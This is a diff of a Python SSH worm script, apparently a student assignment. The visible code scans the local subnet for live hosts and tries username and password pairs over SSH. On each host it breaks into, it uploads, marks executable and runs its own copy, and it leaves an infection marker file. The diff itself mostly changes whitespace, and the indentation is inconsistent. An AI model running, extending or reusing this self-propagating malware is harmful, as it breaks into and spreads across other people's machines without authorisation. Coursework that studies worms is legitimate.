@@ -30,8 +30,11 @@ def isInfectedSystem():
 def markInfected():
 	
     print("Mark file infected")
+
     worm = open(INFECTED_MARKER_FILE, "w")
+	
     worm.write("Your system has been infected")
+
     worm.close()
 
 ###############################################################
@@ -44,9 +47,9 @@ def spreadAndExecute(sshClient):
         sftpClient = sshClient.open_sftp()
 	
    	sftpClient.put("/tmp/worm.py", "/tmp/" + "worm.py")
-
-	sshClient.exec_command("chmod a+x /tmp/worm.py")	
-
+	
+	sshClient.exec_command("chmod a+x /tmp/worm.py")
+	
    	sshClient.exec_command("python /tmp/worm.py ")
  
 
@@ -63,16 +66,24 @@ def spreadAndExecute(sshClient):
 def tryCredentials(host, userName, password, sshClient):
 	
         print("Try to connect to " + host +  " using " +  userName + " and " +  password)
-    	try:
+    	
+	try:
              sshClient.connect(host, username = userName, password = password)
+	
              print("Opened a connectin to the victim's system!")
+		
 	     print("Credentials " + userName + " and " + password + " worked.")
-	     return 0             
+	
+	     return 0      
+	
         except paramiko.SSHException:
              print("Wrong credentials! Try again.")
+	
              return 1
+	
         except socket.error:
              print("Server is down or has some other problem.")
+	
              return 3
 
 ###############################################################
@@ -96,7 +107,9 @@ def attackSystem(host):
 		
 		if (0 == tryCredentials(host, username,password,ssh)):
                     	value = tryCredentials(host, username, password, ssh)
+			
 			print("Successfully compromised the system!")
+			
 			return ssh
 	
 	return None	
@@ -126,7 +139,6 @@ def getHostsOnTheSameNetwork():
 	liveHosts = []
 	
 	for host in hostInfo:
-		
 		if portScanner[host].state() == "up":
 			liveHosts.append(host)
 		
@@ -157,55 +169,56 @@ def cleaner(sshClient):
 if len(sys.argv) < 2:
 	
 	if (isInfectedSystem()):
-		print('Hello')
 		sys.exit()
+		
 	else:
-		print('Hello2')
 		markInfected()
 
 elif (len(sys.argv) == 2):
-# TODO: Get the IP of the current system
+
 		myIP = getMyIP("enp0s3")
+		
 		print("Attacker's current system IP " + myIP)
 
-# Get the hosts on the same network
 		print(" Hosts on the same network")
+		
 		networkHosts = getHostsOnTheSameNetwork()
 
-# from the list of discovered systems (we
-# do not want to target ourselves!).
 		networkHosts.remove(myIP)
 
 		print "Found hosts: ", networkHosts
 
-
-# Go through the network hosts
 		for host in networkHosts:
-	
-	# Try to attack this host
 			sshInfo =  attackSystem(host)
-	
+			
 			print sshInfo
 	
-	# Did the attack succeed?
 			if sshInfo:
-		
 				print "Trying to spread"
-				
+
 				if (sys.argv[1] == '-c'):
 					print("Cleaning worm from host infected:")
+					
 					print(sshInfo)
+					
 					cleaner(sshInfo)
 				else:
 					try:
 						sftp = sshInfo.open_sftp()
+						
         					remotepath = '/tmp/infected.txt'
+						
 		        			localpath = '/home/cpsc/'
+						
 						sftp.get(remotepath, localpath)
+						
 						print("This system is already infected!")
+						
 					except IOError:
 		       				print "This system should be infected"
+						
 						spreadAndExecute(sshInfo)
+						
 						print "Spreading complete"	
 	
 
